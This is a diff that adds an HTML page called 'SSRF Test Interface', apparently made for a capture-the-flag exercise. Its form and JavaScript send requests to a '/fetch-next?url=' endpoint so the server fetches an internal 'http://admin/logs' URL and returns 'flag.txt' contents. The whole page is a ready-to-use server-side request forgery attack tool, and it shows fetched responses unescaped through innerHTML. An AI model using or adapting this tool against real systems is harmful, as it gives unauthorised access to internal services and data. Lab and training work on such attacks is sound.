@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Test Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
+        button { background-color: #007bff; color: white; padding: 12px 24px; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background-color: #0056b3; }
+        .result { margin-top: 20px; padding: 15px; background-color: #f9f9f9; border: 1px solid #ddd; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SSRF Test Interface</h1>
+        <p>Use this interface to test SSRF attacks against the admin panel.</p>
+        
+        <div class="form-group">
+            <label for="url">Target URL:</label>
+            <input type="text" id="url" value="http://admin/logs" placeholder="http://admin/logs">
+        </div>
+        
+        <div class="form-group">
+            <label for="log_file">Log File (for POST data):</label>
+            <input type="text" id="log_file" value="flag.txt" placeholder="flag.txt">
+        </div>
+        
+        <button onclick="performSSRF()">Execute SSRF Attack</button>
+        <button onclick="performSSRFGet()">Execute SSRF (GET only)</button>
+        
+        <div id="result" class="result" style="display: none;"></div>
+    </div>
+    
+    <script>
+        function performSSRF() {
+            const url = document.getElementById('url').value;
+            const logFile = document.getElementById('log_file').value;
+            
+            const formData = new FormData();
+            formData.append('log_file', logFile);
+            
+            fetch(`/fetch-next?url=${encodeURIComponent(url)}`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('result').innerHTML = data;
+                document.getElementById('result').style.display = 'block';
+            })
+            .catch(error => {
+                document.getElementById('result').innerHTML = 'Error: ' + error;
+                document.getElementById('result').style.display = 'block';
+            });
+        }
+        
+        function performSSRFGet() {
+            const url = document.getElementById('url').value;
+            
+            fetch(`/fetch-next?url=${encodeURIComponent(url)}`)
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('result').innerHTML = data;
+                document.getElementById('result').style.display = 'block';
+            })
+            .catch(error => {
+                document.getElementById('result').innerHTML = 'Error: ' + error;
+                document.getElementById('result').style.display = 'block';
+            });
+        }
+    </script>
+</body>
+</html>
